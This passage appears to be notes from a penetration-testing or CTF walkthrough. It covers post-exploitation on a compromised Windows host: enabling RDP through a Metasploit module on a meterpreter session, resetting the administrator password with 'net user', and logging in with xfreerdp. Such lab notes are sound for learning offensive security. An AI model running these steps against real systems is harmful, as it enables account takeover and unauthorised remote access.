- __`search enable_rdp`__
```
use post/windows/manage/enable_rdp
set sesstion 1
exploit
```
- __now you can change the password for the user in my case i have access to the administrator account__
- __so i have meterpreter session running in the background__
- __so use `shell`__
- __change the password__
- __`net user administrator password123`__
- > you have change the password of the admininstrator so that we can login using `xfreerdp` into rdp using this login
- __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__
